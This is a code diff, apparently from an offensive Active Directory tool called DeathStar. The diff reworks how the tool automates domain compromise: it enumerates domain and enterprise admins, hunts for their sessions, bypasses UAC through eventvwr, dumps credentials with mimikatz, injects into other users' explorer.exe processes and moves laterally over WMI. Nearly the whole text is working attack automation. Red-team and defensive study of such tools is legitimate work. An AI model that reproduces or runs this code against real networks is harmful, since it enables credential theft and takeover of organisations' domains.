@@ -23,6 +23,7 @@ __version__ = "2.0"
 import logging
 import argparse
 import asyncio
+import traceback
 from collections import Counter
 from deathstar.kybercrystals import KyberCrystals
 from deathstar.planetaryrecon import PlanetaryRecon
@@ -51,20 +52,21 @@ class DeathStar:
 
         while not self.won.is_set():
             for agent in await self.empire.agents.get():
-                if agent.domain and not self.recon.has_been_performed(agent.domain):
+                if agent.domain and not self.recon.been_performed(agent.domain):
                     log.info(f"{agent.name} => Starting recon on domain '{agent.domain}'")
 
+                    domain = agent.domain
                     domain_sid = await self.kybers.get_domain_sid(agent)
                     domain_admins, enterprise_admins, domain_controllers = await asyncio.gather(*[
-                        self.kybers.get_group_member(agent, domain_sid + "-512"),
-                        self.kybers.get_group_member(agent, domain_sid + "-519"),
+                        self.kybers.get_group_member(agent, domain_sid + "-512"), # DA's
+                        self.kybers.get_group_member(agent, domain_sid + "-519"), # EA's
                         self.kybers.get_domain_controller(agent)
                     ])
 
-                    self.recon.data[agent.domain]["domain_sid"] = domain_sid
-                    self.recon.data[agent.domain]["domain_admins"] = domain_admins
-                    self.recon.data[agent.domain]["enterprise_admins"] = enterprise_admins
-                    self.recon.data[agent.domain]["domain_controllers"] = domain_controllers
+                    self.recon.set_domain_sid(domain, domain_sid)
+                    self.recon.set_domain_admins(domain, domain_admins)
+                    self.recon.set_enterprise_admins(domain, enterprise_admins)
+                    self.recon.set_domain_controllers(domain, domain_controllers)
 
                     log.info(f"{agent.name} => Recon complete for domain '{agent.domain}'")
                     #log.debug("Recon data:" + beautify_json(self.recon.data[agent.domain]))
@@ -74,41 +76,77 @@ class DeathStar:
             await asyncio.sleep(3)
 
     async def galaxy_conquest(self, agent):
-        log.debug(f"{agent.name} => It's wabbit season, hunting for them admins")
+        try:
+            log.debug(f"{agent.name} => Starting galaxy conquest")
 
-        local_admin_access, admin_sessions = asyncio.gather(*[
-            self.kybers.find_localadmin_access(agent),
-            self.kybers.user_hunter(agent)
-        ])
+            conquest_tasks = [
+                asyncio.create_task(self.kybers.find_localadmin_access(agent))
+            ]
 
-        ## Spread here
+            await self.recon.event(agent.domain).wait()
+            log.debug(f"{agent.name} => It's wabbit season, hunting for them admins")
+
+            domain_admins_group = self.recon.get_da_group_name(agent.domain)
+            enterprise_admins_group = self.recon.get_ea_group_name(agent.domain)
+            log.debug(f"DA group: '{domain_admins_group}'")
+            log.debug(f"EA group: '{enterprise_admins_group}'")
+
+            conquest_tasks.extend([
+                asyncio.create_task(self.kybers.user_hunter(agent, domain_admins_group)),
+                asyncio.create_task(self.kybers.user_hunter(agent, enterprise_admins_group))
+            ])
+
+            local_admin_hosts, da_sessions, ea_sessions = await asyncio.gather(*conquest_tasks)
+            self.recon.set_priority_targets(agent.domain, da_sessions)
+            self.recon.set_priority_targets(agent.domain, ea_sessions)
+
+            #rdp_sessions = await asyncio.gather(*[self.kybers.get_rdp_session(agent, host) for host in local_admin_hosts])
+
+            priority_targets = [
+                host 
+                for host in local_admin_hosts
+                if host in self.recon.get_priority_targets(agent.domain)
+            ]
+
+            log.debug(f"{agent.name} => Starting lateral movement")
+            await asyncio.gather(*[self.kybers.invoke_wmi(agent, host) for host in priority_targets])
+            await asyncio.gather(*[self.kybers.invoke_wmi(agent, host) for host in local_admin_hosts])
+        except Exception:
+            tb = traceback.format_exception()
+            log.error(f"Galaxy conquest for agent {agent.name} errored out:\n {tb}")
 
     async def fire_mission(self, agent):
-        seen_usernames = []
+        try:
+            seen_usernames = []
 
-        await self.recon.event(agent.domain).wait()
-        log.debug(f"{agent.name} => Starting fire mission")
+            await self.recon.event(agent.domain).wait()
+            log.debug(f"{agent.name} => Starting fire mission")
 
-        if not agent.high_integrity:
-            self.kybers.bypassuac_eventvwr(agent)
-
-        while not self.won.is_set():
-            for entry in await self.kybers.get_loggedon(agent):
-                username = f"{entry['LogonDomain']}\\{entry['UserName']}"
-                if username in self.recon.all_admins and username not in seen_usernames:
-                    log.info(f"{agent.name} => Admin {username} is logged into {agent.hostname}")
-                    self.priority_targets.append(agent.hostname)
+            if not agent.high_integrity:
+                await self.kybers.bypassuac_eventvwr(agent)
 
             if agent.high_integrity:
-                for process in await self.kybers.tasklist(agent):
-                    if process["UserName"] and process["UserName"] != agent.username and process["UserName"] not in seen_usernames:
-                        log.info(f"{agent.name} => Found process '{process['ProcessName']}' (pid: {process['PID']}) running under {process['UserName']}")
-                        await self.kybers.psinject(agent, process)
-                        continue
-
                 await self.kybers.mimikatz(agent)
 
-            await asyncio.sleep(10)
+            while not self.won.is_set():
+                if agent.high_integrity:
+                    for process in await self.kybers.tasklist(agent):
+                        if process["UserName"] and process["UserName"] != agent.username and process["UserName"] not in seen_usernames:
+                            log.info(f"{agent.name} => Found process(s) running under '{process['UserName']}'")
+                            if process["ProcessName"] == "explorer.exe":
+                                await self.kybers.psinject(agent, process["PID"])
+                                seen_usernames.append(process["UserName"])
+
+                for entry in await self.kybers.get_loggedon(agent):
+                    username = f"{entry['LogonDomain']}\\{entry['UserName']}"
+                    if username in self.recon.all_admins:
+                        log.info(f"{agent.name} => Admin {username} is logged into {agent.hostname}")
+                        self.priority_targets.append(agent.hostname)
+
+                await asyncio.sleep(60)
+        except:
+            tb = traceback.format_exception()
+            log.error(f"Fire mission for agent {agent.name} errored out:\n {tb}")
 
     async def agent_poller(self):
         log.debug("Agent poller started")
@@ -119,10 +157,14 @@ class DeathStar:
                 if not any(
                     map(lambda task: task.get_name() == agent.name, missions)
                 ):
-                    missions.extend([
-                        asyncio.create_task(self.fire_mission(agent), name=agent.name),
-                        asyncio.create_task(self.galaxy_conquest(agent), name=agent.name)
-                    ])
+                        missions.append(
+                            asyncio.create_task(self.fire_mission(agent), name=agent.name)
+                        )
+
+                        if agent.domain:
+                            missions.append(
+                                asyncio.create_task(self.galaxy_conquest(agent), name=agent.name)
+                            )
 
             await asyncio.sleep(3)
 
